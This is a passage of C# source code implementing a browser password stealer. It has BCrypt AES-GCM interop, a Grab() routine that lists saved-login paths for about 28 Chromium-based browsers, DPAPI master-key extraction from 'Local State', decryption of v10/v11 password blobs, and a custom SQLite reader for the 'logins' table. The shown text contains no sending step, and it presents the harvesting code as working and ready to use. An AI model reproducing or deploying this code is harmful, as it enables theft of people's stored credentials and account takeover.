            plainText = new byte[plainTextSize];

            status = BCrypt.BCryptDecrypt(hKey, cipherText, cipherText.Length, ref authInfo, ivData, ivData.Length, plainText, plainText.Length, ref plainTextSize, 0x0);

            if (status == BCrypt.STATUS_AUTH_TAG_MISMATCH)
                throw new CryptographicException("BCrypt.BCryptDecrypt(): authentication tag mismatch");

            if (status != BCrypt.ERROR_SUCCESS)
                throw new CryptographicException(string.Format("BCrypt.BCryptDecrypt() failed with status code:{0}", status));
        }

        BCrypt.BCryptDestroyKey(hKey);
        Marshal.FreeHGlobal(keyDataBuffer);
        BCrypt.BCryptCloseAlgorithmProvider(hAlg, 0x0);

        return plainText;
    }

    private int MaxAuthTagSize(IntPtr hAlg)
    {
        byte[] tagLengthsValue = GetProperty(hAlg, BCrypt.BCRYPT_AUTH_TAG_LENGTH);

        return BitConverter.ToInt32(new[] { tagLengthsValue[4], tagLengthsValue[5], tagLengthsValue[6], tagLengthsValue[7] }, 0);
    }

    private IntPtr OpenAlgorithmProvider(string alg, string provider, string chainingMode)
    {
        IntPtr hAlg = IntPtr.Zero;

        uint status = BCrypt.BCryptOpenAlgorithmProvider(out hAlg, alg, provider, 0x0);

        if (status != BCrypt.ERROR_SUCCESS)
            throw new CryptographicException(string.Format("BCrypt.BCryptOpenAlgorithmProvider() failed with status code:{0}", status));

        byte[] chainMode = Encoding.Unicode.GetBytes(chainingMode);
        status = BCrypt.BCryptSetAlgorithmProperty(hAlg, BCrypt.BCRYPT_CHAINING_MODE, chainMode, chainMode.Length, 0x0);

        if (status != BCrypt.ERROR_SUCCESS)
            throw new CryptographicException(string.Format("BCrypt.BCryptSetAlgorithmProperty(BCrypt.BCRYPT_CHAINING_MODE, BCrypt.BCRYPT_CHAIN_MODE_GCM) failed with status code:{0}", status));

        return hAlg;
    }

    private IntPtr ImportKey(IntPtr hAlg, byte[] key, out IntPtr hKey)
    {
        byte[] objLength = GetProperty(hAlg, BCrypt.BCRYPT_OBJECT_LENGTH);

        int keyDataSize = BitConverter.ToInt32(objLength, 0);

        IntPtr keyDataBuffer = Marshal.AllocHGlobal(keyDataSize);

        byte[] keyBlob = Concat(BCrypt.BCRYPT_KEY_DATA_BLOB_MAGIC, BitConverter.GetBytes(0x1), BitConverter.GetBytes(key.Length), key);

        uint status = BCrypt.BCryptImportKey(hAlg, IntPtr.Zero, BCrypt.BCRYPT_KEY_DATA_BLOB, out hKey, keyDataBuffer, keyDataSize, keyBlob, keyBlob.Length, 0x0);

        if (status != BCrypt.ERROR_SUCCESS)
            throw new CryptographicException(string.Format("BCrypt.BCryptImportKey() failed with status code:{0}", status));

        return keyDataBuffer;
    }

    private byte[] GetProperty(IntPtr hAlg, string name)
    {
        int size = 0;

        uint status = BCrypt.BCryptGetProperty(hAlg, name, null, 0, ref size, 0x0);

        if (status != BCrypt.ERROR_SUCCESS)
            throw new CryptographicException(string.Format("BCrypt.BCryptGetProperty() (get size) failed with status code:{0}", status));

        byte[] value = new byte[size];

        status = BCrypt.BCryptGetProperty(hAlg, name, value, value.Length, ref size, 0x0);

        if (status != BCrypt.ERROR_SUCCESS)
            throw new CryptographicException(string.Format("BCrypt.BCryptGetProperty() failed with status code:{0}", status));

        return value;
    }

    public byte[] Concat(params byte[][] arrays)
    {
        int len = 0;

        foreach (byte[] array in arrays)
        {
            if (array == null)
                continue;
            len += array.Length;
        }

        byte[] result = new byte[len - 1 + 1];
        int offset = 0;

        foreach (byte[] array in arrays)
        {
            if (array == null)
                continue;
            Buffer.BlockCopy(array, 0, result, offset, array.Length);
            offset += array.Length;
        }

        return result;
    }
}
public static class BCrypt
{
    public const uint ERROR_SUCCESS = 0x00000000;
    public const uint BCRYPT_PAD_PSS = 8;
    public const uint BCRYPT_PAD_OAEP = 4;

    public static readonly byte[] BCRYPT_KEY_DATA_BLOB_MAGIC = BitConverter.GetBytes(0x4d42444b);

    public static readonly string BCRYPT_OBJECT_LENGTH = "ObjectLength";
    public static readonly string BCRYPT_CHAIN_MODE_GCM = "ChainingModeGCM";
    public static readonly string BCRYPT_AUTH_TAG_LENGTH = "AuthTagLength";
    public static readonly string BCRYPT_CHAINING_MODE = "ChainingMode";
    public static readonly string BCRYPT_KEY_DATA_BLOB = "KeyDataBlob";
    public static readonly string BCRYPT_AES_ALGORITHM = "AES";

    public static readonly string MS_PRIMITIVE_PROVIDER = "Microsoft Primitive Provider";

    public static readonly int BCRYPT_AUTH_MODE_CHAIN_CALLS_FLAG = 0x00000001;
    public static readonly int BCRYPT_INIT_AUTH_MODE_INFO_VERSION = 0x00000001;

    public static readonly uint STATUS_AUTH_TAG_MISMATCH = 0xC000A002;

    [StructLayout(LayoutKind.Sequential)]
    public struct BCRYPT_PSS_PADDING_INFO
    {
        public BCRYPT_PSS_PADDING_INFO(string pszAlgId, int cbSalt)
        {
            this.pszAlgId = pszAlgId;
            this.cbSalt = cbSalt;
        }

        [MarshalAs(UnmanagedType.LPWStr)]
        public string pszAlgId;
        public int cbSalt;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO : IDisposable
    {
        public int cbSize;
        public int dwInfoVersion;
        public IntPtr pbNonce;
        public int cbNonce;
        public IntPtr pbAuthData;
        public int cbAuthData;
        public IntPtr pbTag;
        public int cbTag;
        public IntPtr pbMacContext;
        public int cbMacContext;
        public int cbAAD;
        public long cbData;
        public int dwFlags;

        public BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO(byte[] iv, byte[] aad, byte[] tag) : this()
        {
            dwInfoVersion = BCRYPT_INIT_AUTH_MODE_INFO_VERSION;
            cbSize = Marshal.SizeOf(typeof(BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO));

            if (iv != null)
            {
                cbNonce = iv.Length;
                pbNonce = Marshal.AllocHGlobal(cbNonce);
                Marshal.Copy(iv, 0, pbNonce, cbNonce);
            }

            if (aad != null)
            {
                cbAuthData = aad.Length;
                pbAuthData = Marshal.AllocHGlobal(cbAuthData);
                Marshal.Copy(aad, 0, pbAuthData, cbAuthData);
            }

            if (tag != null)
            {
                cbTag = tag.Length;
                pbTag = Marshal.AllocHGlobal(cbTag);
                Marshal.Copy(tag, 0, pbTag, cbTag);

                cbMacContext = tag.Length;
                pbMacContext = Marshal.AllocHGlobal(cbMacContext);
            }
        }

        public void Dispose()
        {
            if (pbNonce != IntPtr.Zero) Marshal.FreeHGlobal(pbNonce);
            if (pbTag != IntPtr.Zero) Marshal.FreeHGlobal(pbTag);
            if (pbAuthData != IntPtr.Zero) Marshal.FreeHGlobal(pbAuthData);
            if (pbMacContext != IntPtr.Zero) Marshal.FreeHGlobal(pbMacContext);
        }
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct BCRYPT_KEY_LENGTHS_STRUCT
    {
        public int dwMinLength;
        public int dwMaxLength;
        public int dwIncrement;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct BCRYPT_OAEP_PADDING_INFO
    {
        public BCRYPT_OAEP_PADDING_INFO(string alg)
        {
            pszAlgId = alg;
            pbLabel = IntPtr.Zero;
            cbLabel = 0;
        }

        [MarshalAs(UnmanagedType.LPWStr)]
        public string pszAlgId;
        public IntPtr pbLabel;
        public int cbLabel;
    }

    [DllImport("bcrypt.dll")]
    public static extern uint BCryptOpenAlgorithmProvider(out IntPtr phAlgorithm,
                                                          [MarshalAs(UnmanagedType.LPWStr)] string pszAlgId,
                                                          [MarshalAs(UnmanagedType.LPWStr)] string pszImplementation,
                                                          uint dwFlags);

    [DllImport("bcrypt.dll")]
    public static extern uint BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, uint flags);

    [DllImport("bcrypt.dll", EntryPoint = "BCryptGetProperty")]
    public static extern uint BCryptGetProperty(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbOutput, int cbOutput, ref int pcbResult, uint flags);

    [DllImport("bcrypt.dll", EntryPoint = "BCryptSetProperty")]
    internal static extern uint BCryptSetAlgorithmProperty(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbInput, int cbInput, int dwFlags);


    [DllImport("bcrypt.dll")]
    public static extern uint BCryptImportKey(IntPtr hAlgorithm,
                                                     IntPtr hImportKey,
                                                     [MarshalAs(UnmanagedType.LPWStr)] string pszBlobType,
                                                     out IntPtr phKey,
                                                     IntPtr pbKeyObject,
                                                     int cbKeyObject,
                                                     byte[] pbInput, //blob of type BCRYPT_KEY_DATA_BLOB + raw key data = (dwMagic (4 bytes) | uint dwVersion (4 bytes) | cbKeyData (4 bytes) | data)
                                                     int cbInput,
                                                     uint dwFlags);

    [DllImport("bcrypt.dll")]
    public static extern uint BCryptDestroyKey(IntPtr hKey);

    [DllImport("bcrypt.dll")]
    public static extern uint BCryptEncrypt(IntPtr hKey,
                                            byte[] pbInput,
                                            int cbInput,
                                            ref BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo,
                                            byte[] pbIV, int cbIV,
                                            byte[] pbOutput,
                                            int cbOutput,
                                            ref int pcbResult,
                                            uint dwFlags);

    [DllImport("bcrypt.dll")]
    internal static extern uint BCryptDecrypt(IntPtr hKey,
                                              byte[] pbInput,
                                              int cbInput,
                                              ref BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo,
                                              byte[] pbIV,
                                              int cbIV,
                                              byte[] pbOutput,
                                              int cbOutput,
                                              ref int pcbResult,
                                              int dwFlags);
}
public class Account
{
    public string UserName { get; set; }

    public string Password { get; set; }

    public string URL { get; set; }

    public string Application { get; set; }
}
public class Chromium
{
    public static string LocalApplicationData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
    public static string ApplicationData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

    public static List<Account> Grab()
    {
        Dictionary<string, string> ChromiumPaths = new Dictionary<string, string>()
            {
                {
                    "Chrome",
                    LocalApplicationData + @"\Google\Chrome\User Data"
                },
                {
                    "Opera",
                    Path.Combine(ApplicationData, @"Opera Software\Opera Stable")
                },
                {
                    "Yandex",
                    Path.Combine(LocalApplicationData, @"Yandex\YandexBrowser\User Data")
                },
                {
                    "360 Browser",
                    LocalApplicationData + @"\360Chrome\Chrome\User Data"
                },
                {
                    "Comodo Dragon",
                    Path.Combine(LocalApplicationData, @"Comodo\Dragon\User Data")
                },
                {
                    "CoolNovo",
                    Path.Combine(LocalApplicationData, @"MapleStudio\ChromePlus\User Data")
                },
                {
                    "SRWare Iron",
                    Path.Combine(LocalApplicationData, @"Chromium\User Data")
                },
                {
                    "Torch Browser",
                    Path.Combine(LocalApplicationData, @"Torch\User Data")
                },
                {
                    "Brave Browser",
                    Path.Combine(LocalApplicationData, @"BraveSoftware\Brave-Browser\User Data")
                },
                {
                    "Iridium Browser",
                    LocalApplicationData + @"\Iridium\User Data"
                },
                {
                    "7Star",
                    Path.Combine(LocalApplicationData, @"7Star\7Star\User Data")
                },
                {
                    "Amigo",
                    Path.Combine(LocalApplicationData, @"Amigo\User Data")
                },
                {
                    "CentBrowser",
                    Path.Combine(LocalApplicationData, @"CentBrowser\User Data")
                },
                {
                    "Chedot",
                    Path.Combine(LocalApplicationData, @"Chedot\User Data")
                },
                {
                    "CocCoc",
                    Path.Combine(LocalApplicationData, @"CocCoc\Browser\User Data")
                },
                {
                    "Elements Browser",
                    Path.Combine(LocalApplicationData, @"Elements Browser\User Data")
                },
                {
                    "Epic Privacy Browser",
                    Path.Combine(LocalApplicationData, @"Epic Privacy Browser\User Data")
                },
                {
                    "Kometa",
                    Path.Combine(LocalApplicationData, @"Kometa\User Data")
                },
                {
                    "Orbitum",
                    Path.Combine(LocalApplicationData, @"Orbitum\User Data")
                },
                {
                    "Sputnik",
                    Path.Combine(LocalApplicationData, @"Sputnik\Sputnik\User Data")
                },
                {
                    "uCozMedia",
                    Path.Combine(LocalApplicationData, @"uCozMedia\Uran\User Data")
                },
                {
                    "Vivaldi",
                    Path.Combine(LocalApplicationData, @"Vivaldi\User Data")
                },
                {
                    "Sleipnir 6",
                    Path.Combine(ApplicationData, @"Fenrir Inc\Sleipnir5\setting\modules\ChromiumViewer")
                },
                {
                    "Citrio",
                    Path.Combine(LocalApplicationData, @"CatalinaGroup\Citrio\User Data")
                },
                {
                    "Coowon",
                    Path.Combine(LocalApplicationData, @"Coowon\Coowon\User Data")
                },
                {
                    "Liebao Browser",
                    Path.Combine(LocalApplicationData, @"liebao\User Data")
                },
                {
                    "QIP Surf",
                    Path.Combine(LocalApplicationData, @"QIP Surf\User Data")
                },
                {
                    "Edge Chromium",
                    Path.Combine(LocalApplicationData, @"Microsoft\Edge\User Data")
                }
            };

        var list = new List<Account>();

        foreach (var item in ChromiumPaths)
            list.AddRange(Accounts(item.Value, item.Key));

        return list;
    }


    private static List<Account> Accounts(string path, string browser, string table = "logins")
    {

        //Get all created profiles from browser path
        List<string> loginDataFiles = GetAllProfiles(path);

        List<Account> data = new List<Account>();

        foreach (string loginFile in loginDataFiles.ToArray())
        {
            if (!File.Exists(loginFile))
                continue;

            SQLiteHandler SQLDatabase;

            try
            {
                SQLDatabase = new SQLiteHandler(loginFile); //Open database with Sqlite
            }
            catch (System.Exception ex)
            {
                Console.WriteLine(ex.ToString());
                continue;
            }

            if (!SQLDatabase.ReadTable(table))
                continue;

            for (int I = 0; I <= SQLDatabase.GetRowCount() - 1; I++)
            {
                try
                {
                    //Get values with row number and column name
                    string host = SQLDatabase.GetValue(I, "origin_url");
                    string username = SQLDatabase.GetValue(I, "username_value");
                    string password = SQLDatabase.GetValue(I, "password_value");

                    if (password != null)
                    {
                        //check v80 password signature. its starting with v10 or v11
                        if (password.StartsWith("v10") || password.StartsWith("v11"))
                        {
                            //Local State file located in the parent folder of profile folder.
                            byte[] masterKey = GetMasterKey(Directory.GetParent(loginFile).Parent.FullName);

                            if (masterKey == null)
                                continue;

                            password = DecryptWithKey(Encoding.Default.GetBytes(password), masterKey);
                        }
                        else
                            password = Decrypt(password); //Old versions using UnprotectData for decryption without any key
                    }
                    else
                        continue;

                    if (!string.IsNullOrEmpty(host) && !string.IsNullOrEmpty(username) && !string.IsNullOrEmpty(password))
                        data.Add(new Account() { URL = host, UserName = username, Password = password, Application = browser });
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.ToString());
                }
            }
        }

        return data;
    }

    private static List<string> GetAllProfiles(string DirectoryPath)
    {
        List<string> loginDataFiles = new List<string>
            {
                DirectoryPath + @"\Default\Login Data",
                DirectoryPath + @"\Login Data"
            };

        if (Directory.Exists(DirectoryPath))
        {
            foreach (string dir in Directory.GetDirectories(DirectoryPath))
            {
                if (dir.Contains("Profile"))
                    loginDataFiles.Add(dir + @"\Login Data");
            }
        }

        return loginDataFiles;
    }

    public static string DecryptWithKey(byte[] encryptedData, byte[] MasterKey)
    {
        byte[] iv = new byte[] { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 }; // IV 12 bytes

        //trim first 3 bytes(signature "v10") and take 12 bytes after signature.
        Array.Copy(encryptedData, 3, iv, 0, 12);

        try
        {
            //encryptedData without IV
            byte[] Buffer = new byte[encryptedData.Length - 15];
            Array.Copy(encryptedData, 15, Buffer, 0, encryptedData.Length - 15);

            byte[] tag = new byte[16]; //AuthTag
            byte[] data = new byte[Buffer.Length - tag.Length]; //Encrypted Data

            //Last 16 bytes for tag
            Array.Copy(Buffer, Buffer.Length - 16, tag, 0, 16);

            //encrypted password
            Array.Copy(Buffer, 0, data, 0, Buffer.Length - tag.Length);

            AesGcm aesDecryptor = new AesGcm();
            var result = Encoding.UTF8.GetString(aesDecryptor.Decrypt(MasterKey, iv, null, data, tag));

            return result;
        }
        catch (Exception ex)
        {
            Console.WriteLine(ex.ToString());
            return null;
        }
    }

    public static byte[] GetMasterKey(string LocalStateFolder)
    {
        //Key saved in Local State file
        string filePath = LocalStateFolder + @"\Local State";
        byte[] masterKey = new byte[] { };

        if (File.Exists(filePath) == false)
            return null;

        //Get key with regex.
        var pattern = new System.Text.RegularExpressions.Regex("\"encrypted_key\":\"(.*?)\"", System.Text.RegularExpressions.RegexOptions.Compiled).Matches(File.ReadAllText(filePath));

        foreach (System.Text.RegularExpressions.Match prof in pattern)
        {
            if (prof.Success)
                masterKey = Convert.FromBase64String((prof.Groups[1].Value)); //Decode base64
        }

        //Trim first 5 bytes. Its signature "DPAPI"
        byte[] temp = new byte[masterKey.Length - 5];
        Array.Copy(masterKey, 5, temp, 0, masterKey.Length - 5);

        try
        {
            return ProtectedData.Unprotect(temp, null, DataProtectionScope.CurrentUser);
        }
        catch (Exception ex)
        {
            Console.WriteLine(ex.ToString());
            return null;
        }
    }

    public static string Decrypt(string encryptedData)
    {
        if (encryptedData == null || encryptedData.Length == 0)
            return null;
        try
        {
            return Encoding.UTF8.GetString(ProtectedData.Unprotect(Encoding.Default.GetBytes(encryptedData), null, DataProtectionScope.CurrentUser));
        }
        catch (Exception ex)
        {
            Console.WriteLine(ex.ToString());
            return null;
        }
    }
}
public class SQLiteHandler
{
    private byte[] db_bytes;
    private ulong encoding;
    private string[] field_names;
    private sqlite_master_entry[] master_table_entries;
    private ushort page_size;
    private byte[] SQLDataTypeSize = new byte[] { 0, 1, 2, 3, 4, 6, 8, 8, 0, 0 };
    private table_entry[] table_entries;

    public SQLiteHandler(string baseName)
    {
        if (File.Exists(baseName))
        {
            FileSystem.FileOpen(1, baseName, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared, -1);
            string str = Strings.Space((int)FileSystem.LOF(1));
            FileSystem.FileGet(1, ref str, -1L, false);
            FileSystem.FileClose(new int[] { 1 });
            this.db_bytes = Encoding.Default.GetBytes(str);
            if (Encoding.Default.GetString(this.db_bytes, 0, 15).CompareTo("SQLite format 3") != 0)
            {
                throw new Exception("Not a valid SQLite 3 Database File");
            }
            if (this.db_bytes[0x34] != 0)
            {
                throw new Exception("Auto-vacuum capable database is not supported");
            }
            //if (decimal.Compare(new decimal(this.ConvertToInteger(0x2c, 4)), 4M) >= 0)
            //{
            //    throw new Exception("No supported Schema layer file-format");
            //}
            this.page_size = (ushort)this.ConvertToInteger(0x10, 2);
            this.encoding = this.ConvertToInteger(0x38, 4);
            if (decimal.Compare(new decimal(this.encoding), decimal.Zero) == 0)
            {
                this.encoding = 1L;
            }
            this.ReadMasterTable(100L);
        }
    }

    private ulong ConvertToInteger(int startIndex, int Size)
    {
        if ((Size > 8) | (Size == 0))
        {
            return 0L;
        }
        ulong num2 = 0L;
        int num4 = Size - 1;
        for (int i = 0; i <= num4; i++)
        {
            num2 = (num2 << 8) | this.db_bytes[startIndex + i];
        }
        return num2;
    }

    private long CVL(int startIndex, int endIndex)
    {
        endIndex++;
        byte[] buffer = new byte[8];
        int num4 = endIndex - startIndex;
        bool flag = false;
        if ((num4 == 0) | (num4 > 9))
        {
            return 0L;
        }
        if (num4 == 1)
        {
            buffer[0] = (byte)(this.db_bytes[startIndex] & 0x7f);
            return BitConverter.ToInt64(buffer, 0);
        }
        if (num4 == 9)
        {
            flag = true;
        }
        int num2 = 1;
        int num3 = 7;
        int index = 0;
        if (flag)
        {
            buffer[0] = this.db_bytes[endIndex - 1];
            endIndex--;
            index = 1;
        }
        int num7 = startIndex;
        for (int i = endIndex - 1; i >= num7; i += -1)
        {
            if ((i - 1) >= startIndex)
            {
                buffer[index] = (byte)((((byte)(this.db_bytes[i] >> ((num2 - 1) & 7))) & (((int)0xff) >> num2)) | ((byte)(this.db_bytes[i - 1] << (num3 & 7))));
                num2++;
                index++;
                num3--;
            }
            else if (!flag)
            {
                buffer[index] = (byte)(((byte)(this.db_bytes[i] >> ((num2 - 1) & 7))) & (((int)0xff) >> num2));
            }
        }
        return BitConverter.ToInt64(buffer, 0);
    }

    public int GetRowCount()
    {
        return this.table_entries.Length;
    }

    public string[] GetTableNames()
    {
        string[] strArray2 = null;
        int index = 0;
        int num3 = this.master_table_entries.Length - 1;
        for (int i = 0; i <= num3; i++)
        {
            if (this.master_table_entries[i].item_type == "table")
            {
                strArray2 = (string[])Utils.CopyArray((Array)strArray2, new string[index + 1]);
                strArray2[index] = this.master_table_entries[i].item_name;
                index++;
            }
        }
        return strArray2;
    }

    public string GetValue(int row_num, int field)
    {
        if (row_num >= this.table_entries.Length)
        {
            return null;
        }
        if (field >= this.table_entries[row_num].content.Length)
        {
            return null;
        }
        return this.table_entries[row_num].content[field];
    }

    public string GetValue(int row_num, string field)
    {
        int num = -1;
        int length = this.field_names.Length - 1;
        for (int i = 0; i <= length; i++)
        {
            if (this.field_names[i].ToLower().CompareTo(field.ToLower()) == 0)
            {
                num = i;
                break;
            }
        }
        if (num == -1)
        {
            return null;
        }
        return this.GetValue(row_num, num);
    }

    private int GVL(int startIndex)
    {
        if (startIndex > this.db_bytes.Length)
        {
            return 0;
        }
        int num3 = startIndex + 8;
        for (int i = startIndex; i <= num3; i++)
        {
            if (i > (this.db_bytes.Length - 1))
            {
                return 0;
            }
            if ((this.db_bytes[i] & 0x80) != 0x80)
            {
                return i;
            }
        }
        return (startIndex + 8);
    }

    private bool IsOdd(long value)
    {
        return ((value & 1L) == 1L);
    }

    private void ReadMasterTable(ulong Offset)
    {
        if (this.db_bytes[(int)Offset] == 13)
        {
            ushort num2 = Convert.ToUInt16(decimal.Subtract(new decimal(this.ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 3M)), 2)), decimal.One));
            int length = 0;
            if (this.master_table_entries != null)
            {
                length = this.master_table_entries.Length;
                this.master_table_entries = (sqlite_master_entry[])Utils.CopyArray((Array)this.master_table_entries, new sqlite_master_entry[(this.master_table_entries.Length + num2) + 1]);
            }
            else
            {
                this.master_table_entries = new sqlite_master_entry[num2 + 1];
            }
            int num13 = num2;
            for (int i = 0; i <= num13; i++)
            {
                ulong num = this.ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), 8M), new decimal(i * 2))), 2);
                if (decimal.Compare(new decimal(Offset), 100M) != 0)
                {
                    num += Offset;
                }
                int endIndex = this.GVL((int)num);
                long num7 = this.CVL((int)num, endIndex);
                int num6 = this.GVL(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), decimal.Subtract(new decimal(endIndex), new decimal(num))), decimal.One)));
                this.master_table_entries[length + i].row_id = this.CVL(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), decimal.Subtract(new decimal(endIndex), new decimal(num))), decimal.One)), num6);
                num = Convert.ToUInt64(decimal.Add(decimal.Add(new decimal(num), decimal.Subtract(new decimal(num6), new decimal(num))), decimal.One));
                endIndex = this.GVL((int)num);
                num6 = endIndex;
                long num5 = this.CVL((int)num, endIndex);
                long[] numArray = new long[5];
                int index = 0;
                do
                {
                    endIndex = num6 + 1;
                    num6 = this.GVL(endIndex);
                    numArray[index] = this.CVL(endIndex, num6);
                    if (numArray[index] > 9L)
                    {
                        if (this.IsOdd(numArray[index]))
                        {
                            numArray[index] = (long)Math.Round((double)(((double)(numArray[index] - 13L)) / 2.0));
                        }
                        else
                        {
                            numArray[index] = (long)Math.Round((double)(((double)(numArray[index] - 12L)) / 2.0));
                        }
                    }
                    else
                    {
                        numArray[index] = this.SQLDataTypeSize[(int)numArray[index]];
                    }
                    index++;
                }
                while (index <= 4);
                if (decimal.Compare(new decimal(this.encoding), decimal.One) == 0)
                {
                    this.master_table_entries[length + i].item_type = Encoding.Default.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(new decimal(num), new decimal(num5))), (int)numArray[0]);
                }
                else if (decimal.Compare(new decimal(this.encoding), 2M) == 0)
                {
                    this.master_table_entries[length + i].item_type = Encoding.Unicode.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(new decimal(num), new decimal(num5))), (int)numArray[0]);
                }
                else if (decimal.Compare(new decimal(this.encoding), 3M) == 0)
                {
                    this.master_table_entries[length + i].item_type = Encoding.BigEndianUnicode.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(new decimal(num), new decimal(num5))), (int)numArray[0]);
                }
                if (decimal.Compare(new decimal(this.encoding), decimal.One) == 0)
                {
                    this.master_table_entries[length + i].item_name = Encoding.Default.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0]))), (int)numArray[1]);
                }
                else if (decimal.Compare(new decimal(this.encoding), 2M) == 0)
                {
                    this.master_table_entries[length + i].item_name = Encoding.Unicode.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0]))), (int)numArray[1]);
                }
                else if (decimal.Compare(new decimal(this.encoding), 3M) == 0)
                {
                    this.master_table_entries[length + i].item_name = Encoding.BigEndianUnicode.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0]))), (int)numArray[1]);
                }
                this.master_table_entries[length + i].root_num = (long)this.ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0])), new decimal(numArray[1])), new decimal(numArray[2]))), (int)numArray[3]);
                if (decimal.Compare(new decimal(this.encoding), decimal.One) == 0)
                {
                    this.master_table_entries[length + i].sql_statement = Encoding.Default.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0])), new decimal(numArray[1])), new decimal(numArray[2])), new decimal(numArray[3]))), (int)numArray[4]);
                }
                else if (decimal.Compare(new decimal(this.encoding), 2M) == 0)
                {
                    this.master_table_entries[length + i].sql_statement = Encoding.Unicode.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0])), new decimal(numArray[1])), new decimal(numArray[2])), new decimal(numArray[3]))), (int)numArray[4]);
                }
                else if (decimal.Compare(new decimal(this.encoding), 3M) == 0)
                {
                    this.master_table_entries[length + i].sql_statement = Encoding.BigEndianUnicode.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0])), new decimal(numArray[1])), new decimal(numArray[2])), new decimal(numArray[3]))), (int)numArray[4]);
                }
            }
        }
        else if (this.db_bytes[(int)Offset] == 5)
        {
            ushort num11 = Convert.ToUInt16(decimal.Subtract(new decimal(this.ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 3M)), 2)), decimal.One));
            int num14 = num11;
            for (int j = 0; j <= num14; j++)
            {
                ushort startIndex = (ushort)this.ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), 12M), new decimal(j * 2))), 2);
                if (decimal.Compare(new decimal(Offset), 100M) == 0)
                {
                    this.ReadMasterTable(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(this.ConvertToInteger(startIndex, 4)), decimal.One), new decimal(this.page_size))));
                }
                else
                {
                    this.ReadMasterTable(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(this.ConvertToInteger((int)(Offset + startIndex), 4)), decimal.One), new decimal(this.page_size))));
                }
            }
            this.ReadMasterTable(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(this.ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 8M)), 4)), decimal.One), new decimal(this.page_size))));
        }
    }

    public bool ReadTable(string TableName)
    {
        int index = -1;
        int length = this.master_table_entries.Length - 1;
        for (int i = 0; i <= length; i++)
        {
            if (this.master_table_entries[i].item_name.ToLower().CompareTo(TableName.ToLower()) == 0)
            {
                index = i;
                break;
            }
        }
        if (index == -1)
        {
            return false;
        }
        string[] strArray = this.master_table_entries[index].sql_statement.Substring(this.master_table_entries[index].sql_statement.IndexOf("(") + 1).Split(new char[] { ',' });
        int num6 = strArray.Length - 1;
        for (int j = 0; j <= num6; j++)
        {
            strArray[j] = (strArray[j]).TrimStart();
            int num4 = strArray[j].IndexOf(" ");
            if (num4 > 0)
            {
                strArray[j] = strArray[j].Substring(0, num4);
            }
            if (strArray[j].IndexOf("UNIQUE") == 0)
            {
                break;
            }
            this.field_names = (string[])Utils.CopyArray((Array)this.field_names, new string[j + 1]);
            this.field_names[j] = strArray[j];
        }
        return this.ReadTableFromOffset((ulong)((this.master_table_entries[index].root_num - 1L) * this.page_size));
    }

    private bool ReadTableFromOffset(ulong Offset)
    {
        if (this.db_bytes[(int)Offset] == 13)
        {
            int num2 = Convert.ToInt32(decimal.Subtract(new decimal(this.ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 3M)), 2)), decimal.One));
            int length = 0;
            if (this.table_entries != null)
            {
                length = this.table_entries.Length;
                this.table_entries = (table_entry[])Utils.CopyArray((Array)this.table_entries, new table_entry[(this.table_entries.Length + num2) + 1]);
            }
            else
            {
                this.table_entries = new table_entry[num2 + 1];
            }
            int num16 = num2;
            for (int i = 0; i <= num16; i++)
            {
                record_header_field[] _fieldArray = null;
                ulong num = this.ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), 8M), new decimal(i * 2))), 2);
                if (decimal.Compare(new decimal(Offset), 100M) != 0)
                {
                    num += Offset;
                }
                int endIndex = this.GVL((int)num);
                long num9 = this.CVL((int)num, endIndex);
                int num8 = this.GVL(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), decimal.Subtract(new decimal(endIndex), new decimal(num))), decimal.One)));
                this.table_entries[length + i].row_id = this.CVL(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), decimal.Subtract(new decimal(endIndex), new decimal(num))), decimal.One)), num8);
